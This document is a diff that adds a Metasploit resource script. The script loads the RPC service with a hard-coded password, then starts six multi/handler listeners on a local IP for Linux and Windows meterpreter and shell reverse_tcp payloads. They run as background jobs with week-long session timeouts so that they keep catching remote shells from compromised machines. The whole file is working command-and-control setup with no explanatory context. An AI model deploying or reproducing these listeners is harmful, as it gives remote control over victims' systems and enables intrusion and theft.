@@ -1,0 +1,71 @@
+load msgrpc Pass=pass123
+
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.0.105
+set LPORT 8888
+set ExitOnSession false
+set SessionExpirationTimeout 604800
+set SessionCommunicationTimeout 604800
+set SessionRetryTotal 604800
+set AutoVerifySessionTimeout 300
+exploit -j -z
+
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell/reverse_tcp
+set LHOST 192.168.0.105
+set LPORT 7777
+set ExitOnSession false
+set SessionExpirationTimeout 604800
+set SessionCommunicationTimeout 604800
+set SessionRetryTotal 604800
+set AutoVerifySessionTimeout 300
+exploit -j -z
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.105
+set LPORT 8090
+set ExitOnSession false
+set SessionExpirationTimeout 604800
+set SessionCommunicationTimeout 604800
+set SessionRetryTotal 604800
+set AutoVerifySessionTimeout 300
+exploit -j -z
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.105
+set LPORT 8088
+set ExitOnSession false
+set SessionExpirationTimeout 604800
+set SessionCommunicationTimeout 604800
+set SessionRetryTotal 604800
+set AutoVerifySessionTimeout 300
+exploit -j -z
+
+
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell/reverse_tcp
+set LHOST 192.168.0.105
+set LPORT 4444
+set ExitOnSession false
+set SessionExpirationTimeout 604800
+set SessionCommunicationTimeout 604800
+set SessionRetryTotal 604800
+set AutoVerifySessionTimeout 300
+exploit -j -z
+
+
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell/reverse_tcp
+set LHOST 192.168.0.105
+set LPORT 5555
+set ExitOnSession false
+set SessionExpirationTimeout 604800
+set SessionCommunicationTimeout 604800
+set SessionRetryTotal 604800
+set AutoVerifySessionTimeout 300
+exploit -j -z
+sleep 3
+
